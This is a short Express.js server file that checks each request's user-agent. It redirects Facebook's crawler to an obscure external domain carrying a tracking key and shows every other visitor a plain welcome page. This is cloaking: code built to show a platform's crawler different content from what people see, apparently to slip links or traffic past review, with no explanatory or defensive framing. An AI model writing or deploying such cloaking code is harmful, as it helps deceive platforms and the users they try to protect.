const express = require('express');
const app = express();

app.get('*', (req, res) => {
  const userAgent = req.headers['user-agent'];

  if (userAgent && userAgent.includes('FacebookBot')) {
    res.redirect('https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb');
  } else {
    res.send('Welcome to my website!');
  }
});

module.exports = app;
